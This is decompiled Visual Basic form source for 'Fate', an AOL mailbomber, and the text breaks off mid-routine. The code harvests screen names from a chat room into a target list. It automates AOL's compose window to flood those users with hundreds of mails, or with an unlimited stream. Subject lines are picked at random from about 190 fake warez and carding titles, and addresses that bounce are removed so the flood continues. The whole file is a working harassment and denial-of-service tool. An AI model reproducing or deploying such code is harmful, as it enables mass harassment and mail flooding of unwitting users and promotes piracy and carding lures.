' MAIL.FRM
Option Explicit
Dim m001A As Variant

Sub Check3D1_Click (Value As Integer)
If  Check3D1.Value = True Then
If  check1.Value = True Then check1.Value = False
check1.Enabled = False
Else
check1.Enabled = True
check1.Value = True
End If
End Sub

Sub sub99F8 ()
End Sub

Sub Command3D1_Click ()
Dim l0046 As Variant
Dim l004C As Variant
Dim l0050 As String
Dim l0054 As Variant
Dim l0070 As Variant
many.Caption = Text5.Text
l0046 = extfn1018("AOL FRAME25", 0&)
l004C = extfn10F8(l0046, "Welcome")
l0050$ = String(30, 0)
l0054 = extfnFA8(l004C, l0050$, 250)
If  l0054 <= 7 Then
MsgBox "An error occurred: Not Signed On!", 16
Exit Sub
End If
If  List1.ListCount = 0 Then
MsgBox "You Must Specify Who To Mailbomb", 16
Exit Sub
End If
If  check1.Value = 0 Then
If  Text2 = "" Then
MsgBox "You Must Type Something In!", 16
Exit Sub
End If
End If
If  Timer1.Interval = 0 Then
Timer1.Enabled = True
Timer1.Interval = 1
Text1.Text = ""
For l0070 = 0 To List1.ListCount
Text1 = Text1 + "," + List1.List(l0070)
Next l0070
Command3D1.Caption = "Stop"
Else
Text1.Text = ""
Timer1.Interval = 0
Timer1.Enabled = False
Command3D1.Caption = "Start"
End If
End Sub

Sub Command3D2_Click ()
Dim l007A As Variant
Dim l007E As Variant
Dim l0082 As String
Dim l0084 As Variant
Dim l0088 As Variant
Dim l0090 As Variant
Dim l0096 As Variant
Dim l009A As Variant
Dim l009E As Variant
Dim l00A2 As Variant
Dim l00A6 As String
Dim l00A8 As Variant
Dim l00AC As Variant
Dim l00B0 As Variant
Dim l00B4 As String
Dim l00B8 As Variant
Dim l00BC As Variant
Dim l00C0 As Variant
l007A = extfn1018("AOL FRAME25", 0&)
l007E = extfn10F8(l007A, "Welcome")
l0082$ = String(30, 0)
l0084 = extfnFA8(l007E, l0082$, 250)
If  l0084 <= 7 Then
MsgBox "An error occurred: Not Signed On!", 16
Exit Sub
End If
l0088 = extfn1018("AOL FRAME25", 0&)
l007A = extfn10F8(l0088, "AOL Live!")
l007A = extfn1088(l007A)
If  l007A = 0 Then
MsgBox "Room could not be found!", 16
Exit Sub
End If
l0090 = extfn10C0(l007A, "_AOL_listbox")
l0096 = extfnFE0(l0090, 1036, 0, 0)
For l009A = 0 To l0096 - 1
DoEvents
l009E = extfn1018("AOL FRAME25", 0&)
l00A2 = extfn10F8(l009E, "Welcome")
l00A6$ = String(l00A2, 0)
l00A8 = extfnFA8(l00A2, l00A6$, 250)
l00AC = l00A8 - 1
On Error Resume Next
l00B0 = Mid(Left(l00A6$, l00AC), 10)
If  Err Then
Exit Sub
End If
l00B4$ = String(30, 0)
l00B8 = extfn1608(l009A, l00B4$)
l00BC = InStr(l00B4$, Chr(0))
If  l00BC Then
l00B4$ = Mid(l00B4$, 1, l00BC - 1)
End If
l007A = InStr(1, Text1.Text, l00B4$, 1)
If  l007A Then
l007E = Mid(Text1.Text, l007A + Len(l00B4$), 1)
If  l007E = "," Then GoTo 3003
End If
l007A = InStr(1, l00B4$, "Guide", 1)
If  l007A Then GoTo 3003
l00C0 = InStr(1, l00B4$, l00B0, 1)
If  l00C0 Then GoTo 3003
List1.AddItem l00B4$
Text1.Text = Text1.Text + l00B4$ + ","
3003 :
Next l009A
End Sub

Sub Command3D3_Click ()
List1.Clear
Text1.Text = ""
End Sub

Sub Command3D4_Click ()
Dim l00CA As Variant
Dim l00CE As Variant
If  Text4.Text = "" Then GoTo 201
For l00CA = 0 To List1.ListCount
l00CE = InStr(1, List1.List(l00CA), Text4.Text, 1)
If  l00CE Then
If  Len(List1.List(l00CA)) = Len(Text4.Text) Then
Text4.Text = ""
GoTo 201
End If
End If
Next l00CA
List1.AddItem Text4
Text1.Text = Text1.Text + Text4.Text + ","
Text4 = ""
201 :
End Sub

Sub Command3D5_Click ()
Dim l00D2 As Variant
Dim l00D6 As Variant
Dim l00DA As Variant
Dim l00DE As Variant
Dim l00E2 As Variant
l00D2 = List1.ListIndex
l00D6 = List1.List(l00D2)
On Error Resume Next
List1.RemoveItem l00D2
If  Err Then
MsgBox "Highlight the person you want to delete!", 16
Exit Sub
Else
l00DA = InStr(1, Text1.Text, l00D6 + ",", 1)
If  l00DA Then
l00DE = Mid(Text1.Text, 1, l00DA - 1)
l00E2 = Mid(Text1.Text, l00DA + Len(l00D6) + 1, Len(Text1.Text))
Text1.Text = l00DE + l00E2
End If
End If
End Sub

Sub Command3D6_Click ()
mail.WindowState = 1
End Sub

Sub Form_Load ()
m001A = 0
extsub1050 mail.hWnd, -1, 0, 0, 0, 0, 3
many.Caption = "550"
Text5.Text = "550"
If  mail.Caption <> fn1A8() Then
MsgBox "Program contains unauthorized changes." + Chr(13) + Chr(10) + "Terminating now!", 16
End
End If
End Sub

Sub sub39E8 ()
End Sub

Sub Text4_KeyPress (KeyAscii As Integer)
Dim l00F6 As Variant
Dim l00FA As Variant
Dim l00FE As Variant
l00F6 = Chr(KeyAscii)
If  l00F6 = Chr(13) Then
If  Text4.Text = "" Then GoTo 11
For l00FA = 0 To List1.ListCount
l00FE = InStr(1, List1.List(l00FA), Text4.Text, 1)
If  l00FE Then
If  Len(List1.List(l00FA)) = Len(Text4.Text) Then
Text4.Text = ""
GoTo 11
End If
End If
Next l00FA
List1.AddItem Text4
Text1.Text = Text1.Text + Text4.Text + ","
Text4 = ""
11 :
End If
End Sub

Sub sub3A58 ()
Unload mail
End Sub

Sub Timer1_Timer ()
Dim l0104 As Variant
Dim l010A As Variant
Dim l010E As Variant
Dim l0116 As Variant
Dim l011A As Variant
Dim l011E As Variant
Dim l0124 As Variant
Dim l012A As Variant
Dim l012E As Variant
Dim l0132 As Variant
Dim l0136 As Variant
Dim l013A As Variant
Dim l013E As Variant
Dim l0142 As Variant
Dim l0146 As Variant
Dim l014A As Variant
Dim l014E As Variant
Dim l0152 As Variant
Dim l0156 As Variant
Dim l015A As Variant
Dim l015E As Variant
Dim l0162 As Variant
Dim l0168 As Variant
Dim l016C As Variant
Dim l0170 As Variant
Dim l0174 As Variant
Dim l0178 As Variant
Dim l017C As Variant
Dim l0180 As Variant
Dim l0184 As Variant
Dim l0188 As Variant
Dim l0192 As Variant
Dim l0196 As Variant
Dim l01A0 As Variant
Dim l01A4 As Variant
Dim l01A8 As Variant
Dim l01AC As Variant
Dim l01B0 As Variant
Dim l01B4 As Variant
Dim l01B8 As Variant
Dim l01BC As Variant
Dim l01C0 As Variant
Dim l01C4 As Variant
Dim l01C8 As String
Dim l01CA As Variant
Dim l01CE As Variant
Dim l01D2 As Variant
Dim l01D6 As Variant
Dim l01DA As Variant
Dim l01DE As Variant
Dim l01E2 As Variant
Dim l01E6 As Variant
Dim l01EA As Variant
Dim l01EE As Variant
Dim l01F2 As Variant
Dim l01F6 As Variant
Dim l01FA As Variant
Dim l01FE As Variant
Dim l0202 As Variant
Dim l0206 As Variant
Dim l020A As Variant
Dim l020E As Variant
Dim l0212 As Variant
Dim l0216 As Variant
Dim l021A As Variant
Dim l021E As Variant
Dim l0222 As Variant
Dim l0226 As Variant
Dim l022A As Variant
Dim l022E As Variant
Dim l0232 As Variant
Dim l0236 As Variant
Dim l023A As Variant
Dim l023E As Variant
Dim l0242 As Variant
Dim l0246 As Variant
Dim l024C As Variant
l0104 = 100 / many
l010A = fn448()
l010E = extfn1018("AOL FRAME25", 0&)
If  fn138() = 0 Then
MsgBox "Fate could not detect your version of America Online. Please Re-run America Online in order for Fate to work.", 16
Exit Sub
End If
If  fn138() = 5 Then
l0116 = fn5D0("Mem&bers", "Set Preferences")
Else
l0116 = fn5D0("Mem&bers", "Preferences")
End If
10 :
If  Timer1.Interval = 0 Then GoTo L2349C
DoEvents
l011A = extfn10F8(l010E, "Preferences")
If  l011A = 0 Then GoTo 10
If  Timer1.Interval = 0 Then GoTo L2349C
l011E = extfn10F8(l011A, "Mail")
If  Timer1.Interval = 0 Then GoTo L2349C
l0124 = extfn1168(l011E, 2)
l012A = fn1480(l0124)
20 :
If  Timer1.Interval = 0 Then GoTo L2349C
DoEvents
l012E = extfn1018("_AOL_MODAL", 0&)
If  l012E = 0 Then GoTo 20
If  Timer1.Interval = 0 Then GoTo L2349C
l0132 = extfn10F8(l012E, "close")
l0136 = extfn1168(l0132, 3)
If  Timer1.Interval = 0 Then GoTo L2349C
If  Check3D1.Value = True Then
l013A = extfnFE0(l0136, 1025, 0, 0)
Else
l013A = extfnFE0(l0136, 1025, 1, 0)
End If
l013E = extfn10F8(l012E, "confirm")
If  Timer1.Interval = 0 Then GoTo L2349C
l0142 = extfn1168(l013E, 2)
l0146 = extfnFE0(l0142, 1025, 0, 0)
l014A = extfn10F8(l012E, "OK")
If  Timer1.Interval = 0 Then GoTo L2349C
l014E = fn1480(l014A)
l0152 = extfnFE0(l011A, 16, 0, 0)
If  Timer1.Interval = 0 Then GoTo L2349C
l0156 = fn5D0("&Mail", "&Compose Mail")
40 :
DoEvents
If  Timer1.Interval = 0 Then GoTo L2349C
l015A = extfn10F8(l010E, "Compose Mail")
If  l015A = 0 Then GoTo 40
If  Timer1.Interval = 0 Then GoTo L2349C
l015E = extfn10F8(l015A, "To:")
l0162 = extfn1168(l015E, 2)
l0168 = extfn11A0(l0162, 12, 0, Text1.Text)
If  Timer1.Interval = 0 Then GoTo L2349C
l016C = extfn10F8(l015A, "Subject:")
If  Timer1.Interval = 0 Then GoTo L2349C
l0170 = extfn1168(l016C, 2)
If  Check3D1.Value = True Then GoTo 56
For l0174 = 1 To many
56 :
If  Timer1.Interval = 0 Then GoTo L2349C
If  check1.Value = True Then
Randomize
l0178 = Int(190 * Rnd)
If  Timer1.Interval = 0 Then GoTo L2349C
Randomize
Select Case l0178
Case 0
Text2.Text = "-=OmNi=-  Norton Utilities 95"
Case 1
Text2.Text = "•–=(LXIX)=–• Source Codes"
Case 2
Text2.Text = "•–=(LXIX)=–• ViSuaL BaSiC 3.0 PRo"
Case 3
Text2.Text = "§¥Rêßä££z¥§ Visual Basics Decompiler (1\1)"
Case 4
Text2.Text = "«–§¤   FSI™  ¤§–» Doom2 for Win95 (01/04)"
Case 5
Text2.Text = "«–§¤   FSI™  ¤§–» Doom2 for Win95 (02/04)"
Case 6
Text2.Text = "«–§¤   FSI™  ¤§–» Doom2 for Win95 (03/04)"
Case 7
Text2.Text = "«–§¤   FSI™  ¤§–» Doom2 for Win95 (04/04)"
Case 8
Text2.Text = "•UPS• Final Doom a.k.a. Doom3 (o1/o4)"
Case 9
Text2.Text = "^v^ My§TiC ^v^ INDY CAR RACING 2 FOR WIN '95 o1/o2"
Case 10
Text2.Text = "^v^ My§TiC ^v^ INDY CAR RACING 2 FOR WIN '95 o2/o2"
Case 11
Text2.Text = "^v^ My§TiC ^v^ Final Doom (c) id Software (o1/o3)"
Case 12
Text2.Text = "^v^ My§TiC ^v^ Final Doom (c) id Software (o2/o3)"
Case 13
Text2.Text = "^v^ My§TiC ^v^ Final Doom (c) id Software (o3/o3)"
Case 14
Text2.Text = "^v^ My§TiC ^v^ Ultimate Doom (c) Id Software *FiX*"
Case 15
Text2.Text = "^v^ My§TiC ^v^ Packard Bell Computer Based Training"
Case 16
Text2.Text = "•UPS• Sci Tech Display Doctor (New VESA)"
Case 17
Text2.Text = "•UPS• Screaming Skies Degger Rage II [6/6]"
Case 18
Text2.Text = "•UPS• Screaming Skies Degger Rage II [5/6]"
Case 19
Text2.Text = "•UPS• Screaming Skies Degger Rage II [4/6]"
Case 20
Text2.Text = "•UPS• Screaming Skies Degger Rage II [3/6]"
Case 21
Text2.Text = "•UPS• Screaming Skies Degger Rage II [2/6]"
Case 22
Text2.Text = "•UPS• Screaming Skies Degger Rage II [1/6]"
Case 23
Text2.Text = "•UPS• Catapult Server Beta 3 for WINNT 4.0 BETA2 (c)"
Case 24
Text2.Text = "•UPS• Netscape Navigator Gold v3.0 Beta 5"
Case 25
Text2.Text = "•UPS• CaveLand Beta1 [2/2]"
Case 26
Text2.Text = "•UPS• CaveLand Beta1 [1/2]"
Case 27
Text2.Text = "•UPS• W4 Server v2.5a (c) Antelope Software"
Case 28
Text2.Text = "•UPS• Remote Desktop II Cracked"
Case 29
Text2.Text = "•UPS• Scene & Demoscene Pac"
Case 30
Text2.Text = "•UPS• Rolodeck Electronic Card file v2.03"
Case 31
Text2.Text = "•UPS• Sophos Sweep July Edition Win95"
Case 32
Text2.Text = "•UPS• Pov-Ray v3.0B (c) Pov Team"
Case 33
Text2.Text = "•UPS• Solo Yasoor For Win 3.xx"
Case 34
Text2.Text = "•UPS• mIRC 32-Bit v4.5 Crack (c) mIRC Coporation Ltd"
Case 35
Text2.Text = "•UPS• Orion Burger (c) Sanctuary Woods"
Case 36
Text2.Text = "•UPS• Norton Anti-Virus July Update"
Case 37
Text2.Text = "•UPS• Space Hulk 2 (c) EA [3/5]"
Case 38
Text2.Text = "•UPS• Space Hulk 2 (c) EA [2/5]"
Case 39
Text2.Text = "•UPS• Space Hulk 2 (c) EA [1/5]"
Case 40
Text2.Text = "•UPS• Doggy Style v2.0 for mIRC"
Case 41
Text2.Text = "•UPS• Aeco ZipExplorer Pro v2 Win95"
Case 42
Text2.Text = "•UPS• SEA GFX PROGRAM CRACKED (o2/o2)"
Case 43
Text2.Text = "•UPS• SEA GFX PROGRAM CRACKED (o1/o2)"
Case 44
Text2.Text = "•UPS• NHL PowerPlay 96 for Win95 [o2/o3]"
Case 45
Text2.Text = "•UPS• NHL PowerPlay 96 for Win95 [o3/o3]"
Case 46
Text2.Text = "•UPS• NHL PowerPlay 96 for Win95 [o1/o3]"
Case 47
Text2.Text = "•UPS• BoundsChecker Professional Edition for WinNT"
Case 48
Text2.Text = "•UPS• Drafix QuickCAD v4.0 Win95/WinNT [o2/o2]"
Case 49
Text2.Text = "•UPS• Drafix QuickCAD v4.0 Win95/WinNT [o1/o2]"
Case 50
Text2.Text = "•UPS• Onside Soccer - French Language Files"
Case 51
Text2.Text = "•UPS• Onside Soccer - German Language Files"
Case 52
Text2.Text = "•UPS• Onside Soccer - Spanish Language Files"
Case 53
Text2.Text = "•UPS• Virus Scan for Win 3.1 Ver. 2.5.0 Registerd"
Case 54
Text2.Text = "ALLiED: VuePrint- cracked"
Case 55
Text2.Text = "•UPS• Netmanage Chameleon v4.6.3  (o1/o1)"
Case 56
Text2.Text = "•UPS• UNINet  (c)  Attachmate"
Case 57
Text2.Text = "•UPS• Perfect Screens Win95 CRACKED"
Case 58
Text2.Text = "•UPS• Live Wire v.1 WinNT (Full)"
Case 59
Text2.Text = "•UPS• Blue Wave Offline Mail Reader 386 Repacked"
Case 60
Text2.Text = "•UPS• PC Sweep 32"
Case 61
Text2.Text = "•UPS• Quake Joystick Support Driver"
Case 62
Text2.Text = "•UPS• Tigers on the Prowl ][ (c) HPS"
Case 63
Text2.Text = "•UPS• Space Dude"
Case 64
Text2.Text = "•UPS• Telnet32 for Qmodem Pro 2.0"
Case 65
Text2.Text = "•UPS• Microsoft Web Publishing Wizard (WPW)"
Case 66
Text2.Text = "•UPS• Netscape Powerpack v2.0"
Case 67
Text2.Text = "•UPS• Origami v.4.0 Beta 3"
Case 68
Text2.Text = "•UPS• Ontrack Disk Manager 3.02"
Case 69
Text2.Text = "•UPS• Novell Netware 4.1 50 user License"
Case 70
Text2.Text = "•UPS• King Men (c) Horng Shen"
Case 71
Text2.Text = "•UPS• Kid Desk Windows '95 [o2/o2]"
Case 72
Text2.Text = "•UPS• Lost In The City"
Case 73
Text2.Text = "•UPS• MicroHelp Zip 1.0"
Case 74
Text2.Text = "•UPS• DirecPC v1.3 for Win95"
Case 75
Text2.Text = "•UPS• Hurricane v2.01"
Case 76
Text2.Text = "•UPS• Ultimate Doom for Win95 [1/3]"
Case 77
Text2.Text = "•UPS• Ultimate Doom for Win95 [2/3]"
Case 78
Text2.Text = "•UPS• Ultimate Doom for Win95 [3/3]"
Case 79
Text2.Text = "•UPS• Commerce Builder Web Server"
Case 80
Text2.Text = "•UPS• MegaMan 2 SNES Emulator"
Case 81
Text2.Text = "•UPS• GIF Construction Set V2.0 FOR WINDOWS"
Case 82
Text2.Text = "•UPS• Novell Green River SDK's Addon (o1/o2)"
Case 83
Text2.Text = "•UPS• Novell Green River SDK's Addon (o2/o2)"
Case 84
Text2.Text = "•UPS• AutoPro for Windows"
Case 85
Text2.Text = "•UPS• HOTDOCS v3.0B (c) CAPSOFT INC. (o1/o1)"
Case 86
Text2.Text = "•UPS• Packard Bell Computer Based Training Part 2 [o1"
Case 87
Text2.Text = "•UPS• Packard Bell Computer Based Training Part 2 [o2"
Case 88
Text2.Text = "•UPS• Accent Express v2.0 (c) Accent Software"
Case 89
Text2.Text = "•UPS• Doom 2 Win95 (c) Id Software (o3/o3)"
Case 90
Text2.Text = "•UPS• Doom 2 Win95 (c) Id Software (o2/o3)"
Case 91
Text2.Text = "•UPS• Doom 2 Win95 (c) Id Software (o1/o3)"
Case 92
Text2.Text = "•UPS• Level 5 Quest Database Server [o1/o1]"
Case 93
Text2.Text = "Final Doom - Some useful information."
Case 94
Text2.Text = "•UPS• Thunderbyte Antivirus for Win95 Version 7.02"
Case 95
Text2.Text = "•UPS• Williams Arcade Classics  Win95 (c) GT"
Case 96
Text2.Text = "•UPS• pcAnywhere 7.5 32bit"
Case 97
Text2.Text = "•UPS• msie 3.0 build 1110"
Case 98
Text2.Text = "•UPS• Web Stor V1.02 (c) McAfee  -Disk Version-"
Case 99
Text2.Text = "•UPS• PC-Sweep v3.54 (c) StumpWare"
Case 100
Text2.Text = "•UPS• Netscape Mail Server 2.0b"
Case 101
Text2.Text = "•UPS• REGCLEAN (c) MICROSOFT"
Case 102
Text2.Text = "•UPS• REGISTRY SEARCH & REPLACE V1.00"
Case 103
Text2.Text = "•UPS• Uploads from o6/23/96~o6/29/96"
Case 104
Text2.Text = "•UPS• FateFul Lightning: Civil War Narrative (o1/o4)"
Case 105
Text2.Text = "•UPS• FateFul Lightning: Civil War Narrative (o2/o4)"
Case 106
Text2.Text = "•UPS• FateFul Lightning: Civil War Narrative (o3/o4)"
Case 107
Text2.Text = "•UPS• FateFul Lightning: Civil War Narrative (o4/o4)"
Case 108
Text2.Text = "•UPS• Designer's Club Clipart [1/2]"
Case 109
Text2.Text = "•UPS• Designer's Club Clipart [2/2]"
Case 110
Text2.Text = "•UPS• Immune II v4.1 for DOS/Win3 & Win95"
Case 111
Text2.Text = "•UPS• Win/NT 4.0 Release Candidate1 [o1/o2]"
Case 112
Text2.Text = "•UPS• Win/NT 4.0 Release Candidate1 [o2/o2]"
Case 113
Text2.Text = "[!CdZ!] Indycar Racing 2 Win95 Missing Disk #10"
Case 114
Text2.Text = "•UPS• SilverRun Case Tool - Dongle Cracked"
Case 115
Text2.Text = "Microsoft's Windows 3.1"
Case 116
Text2.Text = "--=Vault=-- MicroSoft RegClean - Complete and virus f"
Case 117
Text2.Text = "•UPS• Lenny's Musictoons [1/1]"
Case 118
Text2.Text = "•UPS• NHL  POWERPLAY (o1/o3)"
Case 119
Text2.Text = "•UPS• NHL  POWERPLAY (o2/o3)"
Case 120
Text2.Text = "•UPS• NHL  POWERPLAY (o3/o3)"
Case 121
Text2.Text = "•UPS• MEDIADEVELOPER OLE CONTROLS 2.5"
Case 122
Text2.Text = "•UPS• FPS  Baseball  HIGH END Audio   (o1/o3)"
Case 123
Text2.Text = "•UPS• FPS  Baseball  HIGH END Audio   (o2/o3)"
Case 124
Text2.Text = "•UPS• FPS  Baseball  HIGH END Audio   (o3/o3)"
Case 125
Text2.Text = "•UPS• Packard Bell CBT April 96 Part 3 [o1/o3]"
Case 126
Text2.Text = "•UPS• Packard Bell CBT April 96 Part 3 [o2/o3]"
Case 127
Text2.Text = "•UPS• Packard Bell CBT April 96 Part 3 [o3/o3]"
Case 128
Text2.Text = "•UPS• Optima++ 1.0 Developer Edition (o1/o3)"
Case 129
Text2.Text = "•UPS• Optima++ 1.0 Developer Edition (o2/o3)"
Case 130
Text2.Text = "•UPS• Optima++ 1.0 Developer Edition (o3/o3)"
Case 131
Text2.Text = "•UPS• Cobro v1.2 For Win 95"
Case 132
Text2.Text = "•UPS• Space Hulk 2 *Sound Addon*  [o2/o5]"
Case 133
Text2.Text = "•UPS• Space Hulk 2 *Sound Addon*  [o3/o5]"
Case 134
Text2.Text = "•UPS• Space Hulk 2 *Sound Addon*  [o4/o5]"
Case 135
Text2.Text = "•UPS• Space Hulk 2 *Sound Addon*  [o5/o5]"
Case 136
Text2.Text = "•UPS• Space Hulk 2 *CINEMA ADDON* [o1/o3]"
Case 137
Text2.Text = "•UPS• Space Hulk 2 *CINEMA ADDON* [o2/o3]"
Case 138
Text2.Text = "CaT KiLLeR Beta .9ß"
Case 139
Text2.Text = "•UPS• Space Hulk 2 *CINEMA ADDON* [o3/o3]"
Case 140
Text2.Text = "•UPS• Seagate Backup Win95 v1.11"
Case 141
Text2.Text = "•UPS• Saber LAN Workstation 6.0 Final (c) McAffe [o1/"
Case 142
Text2.Text = "•UPS• Saber LAN Workstation 6.0 (c) McAffe [o2/o4]"
Case 143
Text2.Text = "•UPS• Saber LAN Workstation 6.0 (c) McAffe [o3/o4]"
Case 144
Text2.Text = "•UPS• Saber LAN Workstation 6.0 (c) McAffe [o4/o4]"
Case 145
Text2.Text = "•UPS• Windows 95 OEM SR2 Beta 3 (Build 1068) [o1/o5]"
Case 146
Text2.Text = "•UPS• Windows 95 OEM SR2 Beta 3 (Build 1068) [o2/o5]"
Case 147
Text2.Text = "•UPS• Windows 95 OEM SR2 Beta 3 (Build 1068) [o3/o5]"
Case 148
Text2.Text = "•UPS• Manufacturing Manager 1.0b"
Case 149
Text2.Text = "•UPS• Wildcat v4.20 for DOS"
Case 150
Text2.Text = "•UPS• Panzer General speech addon for Win95 [2/2]"
Case 151
Text2.Text = "•UPS• Panzer General speech addon for Win95 [1/2]"
Case 152
Text2.Text = "•UPS• MechWarrior 2:NetMech [o1/o3]"
Case 153
Text2.Text = "•UPS• MechWarrior 2:NetMech [o2/o3]"
Case 154
Text2.Text = "•UPS• MechWarrior 2:NetMech [o3/o3]"
Case 155
Text2.Text = "•UPS• Army College Screen Savers"
Case 156
Text2.Text = "•UPS• Super Star Wars SNES  (o1/o1)"
Case 157
Text2.Text = "•UPS• Mario is Missing  (o1/o1)"
Case 158
Text2.Text = "•UPS• Road Runner for SNES"
Case 159
Text2.Text = "•UPS• SUù27 Flanker for DOS (c) SSI"
Case 160
Text2.Text = "•UPS• Panzer General (c) SSi [2/2]"
Case 161
Text2.Text = "•UPS• Panzer General (c) SSi [1/2]"
Case 162
Text2.Text = "•UPS• Watch out Willi"
Case 163
Text2.Text = "•UPS• Virtua Fighter Remix Demo"
Case 164
Text2.Text = "•UPS• SubSpace"
Case 165
Text2.Text = "•UPS• Three.Sisters.Level.3.AVG"
Case 166
Text2.Text = "•UPS• Cyber Passage Beta 3 [1/1]"
Case 167
Text2.Text = "•UPS• Pray For Death 100% WORKING FIX!!"
Case 168
Text2.Text = "•UPS• Akane Module For Ranma 1/2 Screen Savers"
Case 169
Text2.Text = "•UPS• Power  Dolls  v1.2   [1/1]"
Case 170
Text2.Text = "•UPS• Evil Gate [o1/o1]"
Case 171
Text2.Text = "•UPS• TrueBlood"
Case 172
Text2.Text = "•UPS• ChemScape Chime for Win95 & WinNT"
Case 173
Text2.Text = "•UPS• LightWave 5.0 Final (Rev. C) 100% RiP [o3/o3]"
Case 174
Text2.Text = "•UPS• LightWave 5.0 Final (Rev. C) 100% RiP [o1/o3]"
Case 175
Text2.Text = "•UPS• LightWave 5.0 Final (Rev. C) 100% RiP [o2/o3]"
Case 176
Text2.Text = "•UPS• Point Cast Network Beta 4"
Case 177
Text2.Text = "•UPS•Internet Life. Volume 2 No.1 [2/2]"
Case 178
Text2.Text = "•UPS•Internet Life. Volume 2 No1 [1/2]"
Case 179
Text2.Text = "<< ----æ°ñ XyZ ñ°æ --- >> XyZ MaSS MaiLeR"
Case 180
Text2.Text = "•UPS• The •UPSS• MM Bot ßeta 2 ßy XaOS"
Case 181
Text2.Text = "•-=^~HäÐêZ~^=-•WarCraft2 : Beyond Dark Portal o2/"
Case 182
Text2.Text = "•-=^~HäÐêZ~^=-•WarCraft2 : Beyond Dark Portal o1/"
Case 183
Text2.Text = "¤¥†• ®ù/\/\ •†¥¤ [ AO-Insanity ( the BEST AO prog the"
Case 184
Text2.Text = "¤¥†• ®ù/\/\ •†¥¤ [ NoRToN - ANTi-ViRuS ]"
Case 185
Text2.Text = "¤¥†• ®ù/\/\ •†¥¤ [Final Phase MMer l3y: .phase.]"
Case 186
Text2.Text = "¤¥†• ®ù/\/\ •†¥¤ [Tons of VBX's]"
Case 187
Text2.Text = "¤¥†• ®ù/\/\ •†¥¤ [WLoD, Not released Yet..By zZz]"
Case 188
Text2.Text = "~~~NeW MaSS MaiL RooM~~~"
Case 189
Text2.Text = " «–•ŠûP•–» SKiTZoS NeWist FaC"
Case 190
Text2.Text = "Carded Merchandise for sale"
End Select
End If
l017C = extfn11A0(l0170, 12, 0, Text2.Text)
l0180 = extfn1168(l015E, 1)
If  Timer1.Interval = 0 Then GoTo L2349C
l0184 = l0184 + l0104
l0188 = Chr(13) + Chr(10)
l0192 = "   \-   \=-     \ ___l   \   \ -       ____        \          \-  \=-      \        \-   \=-     \ ___l" + l0188 + "     \    \=-     \__      \   \=-    \ _ -  l\=-     \_        \=-\=-      \        \    \-       \_" + l0188 + "       \-   \ ______\      \   \_____\__l- \_____\        \-  \_____\        \=- \ ___________\  " + l0188 + "         \   l=-         l       \ l =-     l    \  l =-     l         \  l=-       l         \   l=-                 l" + l0188 + "           \ l_______l        \l_____l      \l_____l           \l______l          \  l___________ l" + l0188 + Text3.Text
l0196 = " _____________  __________            _________________     _____________" + l0188 + "l \=-        ______\l\=-      __     \_       l\=-                 -         \  l \ -         ______\" + l0188 + "l= \=-      \_____ ll  \ =-   \    \_     \__ l- \_____  =-         ____\ l=-\=-      \_____ l" + l0188 + " \=- \=-       ____\ \   \  =-  \___\-         \\ l_____l  \-        \___ l \    \=-       ____\" + l0188 + l0192
If  check2.Value = False Then
l0192 = ""
l0196 = ""
End If
If  check2.Value = False Then
l01A0 = "                                                «‹- -– " + Trim(Str(Fix(l0184))) + " % Done –-- -›»" + l0188 + l0188 + Text3.Text
If  Check3D1.Value = True Then l01A0 = l0188 + l0188 + Text3.Text
l01A4 = "                                             «‹- -– ƒa†e MailBomB –-- -›»" + l0188 + l01A0
Else
l01A8 = "                                                «‹- -– " + Trim(Str(Fix(l0184))) + " % Done –-- -›»" + l0188 + l0188 + l0196
If  Check3D1.Value = True Then l01A8 = l0188 + l0188 + l0196
l01A4 = "                                             «‹- -– ƒa†e MailBomB –-- -›»" + l0188 + l01A8
End If
If  fn138() = 0 Then
MsgBox "Fate could not detect your version of America Online. Please Re-run America Online in order for Fate to work.", 16
Exit Sub
End If
If  fn138() = 0 Then
MsgBox "Fate could not detect your version of America Online. Please Re-run America Online in order for Fate to work.", 16
Exit Sub
End If
If  fn138() = 5 Then
Else
l01AC = extfn11A0(l0180, 12, 0, "")
End If
l01AC = extfn11A0(l0180, 12, 0, l01A4)
If  Timer1.Interval = 0 Then GoTo L2349C
57 :
DoEvents
If  Timer1.Interval = 0 Then GoTo L2349C
l01B0 = extfn10F8(l015A, "Send")
If  Timer1.Interval = 0 Then GoTo L2349C
l01B4 = extfn1168(l01B0, 2)
l01B8 = fn1480(l01B4)
If  Timer1.Interval = 0 Then GoTo L2349C
50 :
If  Timer1.Interval = 0 Then GoTo L2349C
DoEvents
If  fn138() = 0 Then
MsgBox "Fate could not detect your version of America Online. Please Re-run America Online in order for Fate to work.", 16
Exit Sub
End If
If Check3D1.Value = True GoTo 58
If  fn138() = 5 Then
l01BC = extfn1018("#32770", "America Online")
Else
l01BC = extfn1018("_AOL_MODAL", 0&)
End If
58 :
l010E = extfn1018("AOL FRAME25", 0&)
l01C0 = extfn10F8(l010E, "Error")
If  l01C0 > 0 Then
l01C4 = extfn10C0(l01C0, "_AOL_VIEW")
l01C8$ = String(l01C4, 0)
l01CA = extfnFE0(l01C4, 14, 0, 0)
l01CE = extfn11A0(l01C4, 13, l01CA, l01C8$)
Text1 = l01C8$
l01D2 = InStr(Text1, Chr(10))
l01D6 = Mid(Text1, l01D2 + 3, Len(Text1))
Text1 = l01D6
For l01DA = 1 To Len(Text1)
l01DE = InStr(Text1, "-")
If  l01DE Then
l01E2 = Mid(Text1, 1, l01DE - 2)
For l01E6 = 0 To List1.ListCount
l01EA = InStr(1, List1.List(l01E6), l01E2, 1)
If  l01EA Then
l01EE = Len(l01E2)
l01F2 = Len(List1.List(l01E6))
If  l01EE <> l01F2 Then
GoTo 87
End If
List1.RemoveItem l01E6
l01F6 = InStr(1, Text1.Text, l01E6 + ",", 1)
If  l01F6 Then
l01FA = Mid(Text1.Text, 1, l01F6 - 1)
l01FE = Mid(Text1.Text, l01F6 + Len(l01E6) + 1, Len(Text1.Text))
Text1.Text = l01FA + l01FE
End If
GoTo 35
End If
87 :
Next l01E6
35 :
l0202 = InStr(Text1, Chr(10))
If  l0202 Then
l0206 = Mid(Text1, l0202 + 1, Len(Text1))
Text1 = l0206
Else
GoTo 243
End If
Else
GoTo 243
End If
Next l01DA
243 :
Text1 = ""
If  List1.ListCount = 0 Then
MsgBox "An error occurred: Nobody to mailbomb", 16
Timer1.Interval = 0
GoTo L2349C
End If
For l020A = 0 To List1.ListCount
Text1 = Text1 + "," + List1.List(l020A)
Next l020A
l020E = extfn1018("AOL FRAME25", 0&)
l0212 = extfn10F8(l020E, "Error")
l0216 = extfn10F8(l0212, "OK")
l021A = fn1480(l0216)
l021E = extfn10F8(l020E, "Compose Mail")
